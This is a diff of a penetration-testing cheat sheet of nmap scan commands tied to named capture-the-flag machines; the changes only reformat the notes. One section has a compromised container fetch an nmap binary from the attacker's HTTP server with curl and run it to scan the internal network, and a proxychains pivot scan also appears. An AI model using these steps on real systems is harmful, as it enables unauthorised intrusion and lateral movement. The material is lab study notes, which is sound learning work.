@@ -105,20 +105,26 @@ nmap -sVC -p22,80 $TARGET -oN service
 nmap -sVC -p22,23,80,9999,20443,24433,28080,50628 $TARGET -oN service
 nmap -sVC -p80 $TARGET -oN service
 ```
-Used on: **davesblog**, **Gaara**, **hfb1royalrouter**, **Parcel** - targeted service/version scans after known open ports were identified.
+Used on: **davesblog**, **Gaara**, **hfb1royalrouter**, **Parcel**
+
+targeted service/version scans after known open ports were identified.
 
 ### Minimal default scan
 ```bash
 nmap $TARGET
 ```
-Used on: **flower** - quick reachability and open-port check before web fuzzing.
+Used on: **flower**
+
+quick reachability and open-port check before web fuzzing.
 
 ### UDP scan for exposed VoIP/SIP services
 ```bash
 nmap -sU --top-ports 2000 -n -Pn --min-rate 2000 $TARGET --open -oN udp-top-2000
 nmap -sU -p- -n -Pn --min-rate 2000 $TARGET --open -oN udp-top-2000
 ```
-Used on: **Aster**, **hfb1royalrouter** - checked UDP services after TCP enumeration, including SIP on `5060/udp`.
+Used on: **Aster**, **hfb1royalrouter**
+
+checked UDP services after TCP enumeration, including SIP on `5060/udp`.
 
 ---
 
@@ -128,7 +134,9 @@ nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent-web-server
 nmap -sVC -p22,80,443,10000 $TARGET -oN service-web-server
 proxychains nmap -sT -Pn -n 10.200.180.1-255 -oN scan
 ```
-Used on: **Wreath** — `-sT` required when routing through proxychains (no raw sockets).
+Used on: **Wreath**
+
+`-sT` required when routing through proxychains (no raw sockets).
 
 ---
 
@@ -138,7 +146,7 @@ nmap -sC -sV -p- TARGET_IP
 ```
 Used on: **Kobold**, **CCTV**, **DevArea**
 
----
+--
 
 ### Overwatch — targeted AD port list (no ping, no DNS)
 ```bash
@@ -146,7 +154,7 @@ nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,4966
 ```
 Used on: **Overwatch**
 
----
+--
 
 ### ohmyweb — static binary drop inside stripped container
 ```bash
@@ -158,7 +166,9 @@ cd ~/static-bins && sudo python3 -m http.server 80
 curl -fsSL http://$LHOST/nmap -o /tmp/nmap && chmod +x /tmp/nmap
 /tmp/nmap 172.17.0.1 -p- --min-rate 5000
 ```
-Used on: **ohmyweb** — found OMI/OMIGOD on `5986/tcp`. See: [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md)
+Used on: **ohmyweb**
+
+found OMI/OMIGOD on `5986/tcp`. See: [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md)
 
 ---
 
@@ -172,7 +182,9 @@ nmap -sS -p- -n -Pn --min-rate 5000 -iL targets.txt --open -oN silent-targets
 nmap -sVC -p 22,80,631,8002 10.200.30.101 -oN service-10.200.30.101
 nmap -sVC -p 135,139,445,3389,5985 10.200.30.10 -oN service-10.200.30.10
 ```
-Used on: **Bandit** — scanned the assigned network segment; discovered Ubuntu (ATS, CUPS, Hadoop) and Windows (RDP, WinRM, SMB) hosts.
+Used on: **Bandit**
+
+scanned the assigned network segment; discovered Ubuntu (ATS, CUPS, Hadoop) and Windows (RDP, WinRM, SMB) hosts.
 
 - `-iL targets.txt` — read target IPs/ranges from a file instead of the command line
 - One output file per host keeps service results cleanly separated
